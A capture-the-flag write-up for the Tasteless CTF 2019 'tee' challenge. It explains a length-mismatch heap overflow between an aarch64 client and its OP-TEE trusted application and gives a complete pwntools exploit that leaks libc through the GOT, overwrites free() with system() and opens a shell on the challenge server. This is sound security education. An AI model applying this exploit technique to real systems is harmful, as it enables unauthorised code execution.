# Tasteless CTF 2019 - tee [pwn 500]

```
Everyone knows the real secret to good tea is getting the steep time just about right. As it it is a secret, tasteless supports saving it in a secure storage.

nc hitme.tasteless.eu 10301
Flag in /flag1.txt
```

## Summary

In this challenge we are given access to a Linux application compiled for aarch64 that interacts with a Trusted Execution Environment (TEE) and uses it to store some data. There is an exploitable bug where the TEE applet will return more data than the client expects, overflowing the client's buffer. The data returned by the applet is controlled by us and we can use it to smash the client's heap and get a shell on the server.

## Introduction

This challenge runs on aarch64 Linux, emulated with QEMU. We are given the initramfs for the virtual machine, a kernel image and a script to start QEMU. The challenge also comes with a few more binary files (`bl1.bin` and so on): a quick look at the launch script tells us that these contain the BIOS for the VM.

The challenge also comes with a copy of the relevant binaries that have been extracted from the initramfs. We are given a libc, the main executable called `tstlss_tee`, and two more files (`libteec.so.1.0.0` and `7a571e55-d0e5-7ea5-900d-deadbeef1336.elf`).

## Analysis

The first thing we did was to extract the initramfs and have a look at what's inside.
We can find a shell script called `init` in the root directory of the extracted filesystem. This is the first program that Linux runs once it has finished booting. Let's have a look inside.

```sh
#!/bin/sh
# devtmpfs does not get automounted for initramfs

DAEMON="tee-supplicant"
DAEMON_PATH="/usr/sbin"
DAEMON_ARGS="-d /dev/teepriv0"
PIDFILE="/var/run/$DAEMON.pid"

start_tee() {
    printf 'Set permissions on %s: ' "/dev/tee*"
    chown root:tee /dev/teepriv0 && chmod 0660 /dev/teepriv0 && \
        chown root:teeclnt /dev/tee0 && chmod 0660 /dev/tee0
    status=$?
    if [ "$status" -eq 0 ]; then
        echo "OK"
    else
        echo "FAIL"
        return "$status"
    fi
    if [ -e /dev/ion ]; then
        printf 'Set permissions on %s: ' "/dev/ion"
        chown root:ion /dev/ion && chmod 0660 /dev/ion
        status=$?
        if [ "$status" -eq 0 ]; then
            echo "OK"
        else
            echo "FAIL"
            return "$status"
        fi
    fi
    printf 'Create/set permissions on %s: ' "/data/tee"
    mkdir -p /data/tee && chown -R tee:tee /data/tee && chmod 0770 /data/tee
    status=$?
    if [ "$status" -eq 0 ]; then
        echo "OK"
    else
        echo "FAIL"
        return "$status"
    fi
    printf 'Starting %s: ' "$DAEMON"
    start-stop-daemon -S -q -p "$PIDFILE" -c tee -x "$DAEMON_PATH/$DAEMON" \
        -- $DAEMON_ARGS
    status=$?
    if [ "$status" -eq 0 ]; then
        echo "OK"
    else
        echo "FAIL"
    fi
}

/bin/mount -t devtmpfs devtmpfs /dev
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console
#/bin/sh

chown ctf:ctf /flag1.txt
chmod 400 /flag1.txt

chown root:root /flag2.txt
chmod 600 /flag2.txt

chown root:root /usr/bin/tstlss_tee
chmod 4755 /usr/bin/tstlss_tee

start_tee

stty raw -ctlecho

su ctf -c "/usr/bin/tstlss_tee"
```

The script starts some kind of daemon in `start_tee()` and then launches the main challenge executable. Interestingly there are not one but two flags, even though the challenge only mentions one.

### Main binary

At this point it was pretty clear that we had to reverse the main binary and find a bug, so we started by launching the VM and having a look at its output.

```
######################################
#                                    #
#    LAMEST TEA SETS presents:       #
#                                    #
#     The first,                     #
#            the unique,             #
#                    the great       #
#            TEA-TEE-REE!            #
#                                    #
#   (for especially tasteless tea)   #
######################################

What do you want to do?
[A]dd tea
[M]odify tea
[R]emove tea
[L]ist tea
[B]rew tea
[E]xit
>
```

We are presented with the familiar menu-based interface typical of heap-based pwnables. We can add, modify, brew, and remove teas, as well as see a list of the teas we have created. Each tea has a numeric ID, a name, a description, and a steep time.

Next, we loaded the main binary in Ghidra and started reversing. The first thing we noticed is that the binary is using some unfamiliar APIs such as `TEEC_InitializeContext`, and `TEEC_InvokeCommand`. A quick Google search found the [OP-TEE project](https://github.com/OP-TEE), a trusted execution environment (TEE) that runs trusted applications (TAs) on ARM processors using [TrustZone](https://genode.org/documentation/articles/trustzone).
At a quick glance TrustZone seems to work in a similar way to Intel's SGX, in that it adds a special "secure" CPU mode that is inaccessible to the software running outside of it, including the (untrusted) kernel. Userspace applications can interact with trusted applications through a special kernel driver.

The main binary requests to load the trusted application (`7a571e55-d0e5-7ea5-900d-deadbeef1336.elf`) into the secure world and then enters the main loop. It creates a heap allocated `tea` structure for each tea and keeps all teas in a singly-linked list. A `tea` contains pointers to the name and ID of the tea and the length of its description, but not the contents of the description and the steep time. Those are stored in the secure world and the main binary needs to interact with the trusted application every time it wants to read or modify them.

### Trusted application

Our analysis of the main binary didn't uncover any obvious vulnerabilities, so we turned our attention to the trusted application. Luckily this is a regular aarch64 ELF file that can be directly loaded into your favorite disassembler.

The entry point for servicing requests coming from the normal world is `TA_InvokeCommandEntryPoint`. Here the code dispatches the request to the right handler and then returns to the normal world. For example, this is the `add_tea` handler, decompiled by Ghidra and cleaned up for readability.

```c
// Parameters: name, description, steep time
TEE_Result add_tea(uint32_t parameters_type, TEE_Param *parameters)
{
    TEE_ObjectHandle handle;

    // Check the type of the input parameters
    if (parameters_type != TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INPUT,
        TEE_PARAM_TYPE_MEMREF_INPUT, TEE_PARAM_TYPE_VALUE_INPUT,
        TEE_PARAM_TYPE_NONE)) {
        return TEE_ERROR_BAD_PARAMETERS;
    }

    if (parameters[2].value.a >= 1000) {
        return TEE_ERROR_TIME_NOT_SET;
    }

    size_t name_length = strlen(parameters[0].memref.buffer);
    char *name_buffer = TEE_Malloc(name_length, 0);

    if (name_buffer == NULL) {
        return TEE_ERROR_OUT_OF_MEMORY;
    }

    TEE_MemMove(name_buffer, parameters[0].memref.buffer, name_length);
    size_t initialDataLen = parameters[1].memref.size + 4;
    char *data_buffer = TEE_Malloc(initialDataLen, 0);

    if (data_buffer == NULL) {
        free(name_buffer);
        return TEE_ERROR_OUT_OF_MEMORY;
    }

    snprintf(data_buffer, 4, "%d", parameters[2].value.a);
    TEE_MemMove(data_buffer + 4, parameters[1].memref.buffer, parameters[1].memref.size);

    // Create the persistent object
    TEE_Result ret = TEE_CreatePersistentObject(1, name_buffer, name_length, 7,
        NULL, data_buffer, initialDataLen, &handle);

    TEE_CloseObject(handle);
    TEE_Free(name_buffer);
    TEE_Free(data_buffer);

    return ret;
}
```

As we can see the steep time and description of the tea are stored in a persistent object, which seems to work approximately like a file. The name of the tea is used as the name of the file.

## The Bug

After analyzing the two binaries for a few hours we finally found something that looked promising in the implementation of Modify. This is the TA side:

```c
// Parameters: name, new description, new steep time
TEE_Result mfy_tea(uint32_t parameters_type, TEE_Param *parameters)
{
    TEE_Result ret;

    /* ... */ 

    char *new_description = parameters[1].memref.buffer;
    size_t new_description_length = parameters[1].memref.size;

    if (strncmp(new_description, "NOPE", 4) == 0) {
        ret = TEE_SUCCESS;
    } else {
        ret = set_description(name_buffer, new_description, new_description_length);
    }

    free(NULL);
    free(name_buffer);
    return ret;
}
```

and this is the client side:
```c
void modify_tea(void)
{
    printf("id: ");
    int tea_id = get_int();
    struct tea *tea = get_tea_by_id(tea_id);

    printf("Modify name? [y/n] ");
    char choice = get_char();

    if (choice == 'y') {
        printf("New name: ");
        new_name = get_string(32);
    } else {
        new_name = NULL;
    }

    printf("Modify description? [y/n] ");
    choice = get_char();

    if (choice == 'y') {
        printf("New description length: ");
        tea->description_length = get_int();
        printf("New description: ");
        new_description = get_string(tea->description_length);
    } else {
        new_description = malloc(8);
        strcpy(new_description,"NOPE");
    }

    printf("Modify steep time? [y/n] ");
    choice = get_char();

    if (choice == 'y') {
        printf("New steep time: ");
        new_steep_time = get_int();
    } else {
        new_steep_time = 0;
    }

    if (new_name != NULL) {
        if (tea->original_name == tea->name) {
            tea->name = new_name;
        } else {
            memcpy(tea->name, new_name, 32);
            free(new_name);
        }
    }

    TEEC_Operation operation = {0};
    operation.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,
        TEEC_MEMREF_TEMP_INPUT, TEEC_VALUE_INPUT, TEEC_NONE);

    operation.params[0].tmpref.buffer = tea->original_name;
    operation.params[0].tmpref.size = 32;
    operation.params[1].tmpref.buffer = new_description;
    operation.params[1].tmpref.size = tea->description_length;
    operation.params[2].value.a = new_steep_time;

    uint32_t returnOrigin;

    TEEC_Result ret = TEEC_InvokeCommand(&teec_session, 3, &operation, &returnOrigin);
    if (ret != TEEC_SUCCESS) {
        puts("Whatever you did, you did it wrong!");
    }

    free(new_description);
}
```

When the trusted side sees that the new description of the tea is "NOPE", it doesn't modify the description. This is because when the user asks to modify a tea but not its description, the client will set the new description to "NOPE" and won't modify the tea's description length. However (and this is where the bug lies) we can tell the client that we want to set the description to "NOPE", and in that case the client will set the tea's description length to 5 (four letters and one newline). The catch is that the secure application treats both cases the same way, and so manually setting the description to "NOPE" will create an inconsistency between the data stored in the client and the data stored in the secure world. The client will think that the description's length is now 5, but the secure application will think that the length is unchanged.

When the client wants to read the description of a tea from the secure world, it has to allocate a buffer to accomodate the incoming data. The client allocates just enough memory to hold the description. Or at least, what it *thinks* is enough memory. As we have seen we can make the client believe that a description is shorter than it actually is, and thus we can make it allocate a buffer that is too small. When the secure application copies the description into this buffer, it will overflow it and overwrite whatever is located past the end.

## Exploitation

Let's first run `checksec` on the binary to see what mitigations it has.

```
[*] 'tstlss_tee'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The main binary is not position-independent, and it doesn't have full RELRO (meaning that the GOT is writable). All we need to do to get code execution is to overwrite a GOT entry. An easy way to get a shell is to overwrite the GOT entry for `free()` with the address of `system()` in libc, and free a chunk that contains `/bin/sh`.

The client allocates tea description buffers on the heap, so we need a target object that can give us an arbitrary write
or another useful primitive when overwritten. We will make sure that this object gets allocated after the description
buffer and overflow into it.
The main binary only uses the heap for `tea` structures, tea names, and temporary description buffers. Overwriting names and
descriptions is not very useful because we can already do that without an exploit, so we'll take a look at the `tea` structure instead.

```c
struct tea {
    int id;
    char *original_name;
    char *current_name;
    size_t description_length;
    struct tea *next;
};
```

This looks quite promising: when listing teas the client prints the string pointed to by `current_name` (or `original_name` if the name was never changed), and by overwriting the pointer with an address of our choice we can leak memory at that address. This gives us an arbitrary read. But more importantly, when modifying a tea's name the client `memcpy`s 32 bytes of input to the memory pointed to by `current_name`. This gives us an arbitrary write.

We now have a clear plan:
* Overwrite a `tea` on the heap and set the `current_name` pointer to the GOT entry for `free()`;
* Print the tea to leak the address of `free()`, and therefore that of libc;
* Change the name of the tea to the address of `system()`;
* Free a chunk that contains `/bin/sh`;
* ???
* Profit!

There is only one missing piece in the puzzle: how do we make sure that the buffer that the client allocates for the description is allocated before a `tea` in memory?
As luck would have it, we don't need to do anything special. If we allocate two teas with short descriptions and set the first's description first to our payload and then to "NOPE", the client will allocate the description buffer right before the second tea and overflow right into it.

We can finally get a shell and used it to read the flag: `tctf{wh0_doesnt_like_tee?}`.

Thanks to the challenge author, this one was pretty fun!

Here’s the entire exploit code:

```py
from pwn import *


# Path to the target binary
BINARY = '../binaries/tstlss_tee'

LIBC = '../binaries/libc-2.28.so'

# Host and port where the challenge is running
HOST = 'hitme.tasteless.eu'
PORT = 10301


# When launched with "remote" in the command line arguments, the script will
# connect with the remote target. Otherwise it will spawn an instance of the
# target locally and interact with that.
REMOTE = 'remote' in sys.argv


e = ELF(BINARY)
context.binary = e

if LIBC and os.path.exists(LIBC):
    libc = ELF(LIBC)
    binsh_addr = next(libc.search('/bin/sh'))
elif e.libc:
    libc = e.libc
    binsh_addr = next(libc.search('/bin/sh'))


if REMOTE:
    r = remote(HOST, PORT)
else:
    r = process(['./run.sh'], raw=True)


def add(name, description):
    r.sendlineafter('What do you want to do?', 'a')
    r.sendlineafter('Name: ', name)
    r.sendlineafter('Description length: ', str(len(description) + 1))
    r.sendlineafter('Description: ', description)
    r.sendlineafter('Steep time: ', '1')


def modify(id, name, description):
    r.sendlineafter('What do you want to do?', 'm')
    r.sendlineafter('id: ', str(id))

    if name:
        r.sendlineafter('Modify name? [y/n] ', 'y')
        r.sendlineafter('New name: ', name)
    else:
        r.sendlineafter('Modify name? [y/n] ', 'n')

    if description:
        r.sendlineafter('Modify description? [y/n] ', 'y')
        r.sendlineafter('New description length: ', str(len(description)))
        r.sendlineafter('New description: ', description)
    else:
        r.sendlineafter('Modify description? [y/n] ', 'n')

    r.sendlineafter('Modify steep time? [y/n] ', 'n')


def remove(id):
    r.sendlineafter('What do you want to do?', 'r')
    r.sendlineafter('id: ', str(id))


def show():
    r.sendlineafter('What do you want to do?', 'l')

challenge = r.recvline()
response = subprocess.check_output(['../../pow', challenge])
r.send(response)

print 'POW ok'

r.recvuntil('LAMEST TEA SETS')

add('first', 'a')
add('second', 'a')

payload = 'A' * 0x20
payload += p64(1) + p64(e.bss() + 100) + p64(e.got['free']) + p64(0)

modify(0, None, payload)
modify(0, None, 'NOPE')

show()

r.recvuntil('name: ')
r.recvuntil('name: ')
free = r.recvline(keepends=False)
free += '\x00' * (8 - len(free))
free = u64(free)
libc.address = free - libc.symbols['free']

success('libc at {}'.format(hex(libc.address)))

modify(1, p64(libc.symbols['system']), '/bin/sh')

r.interactive()
```
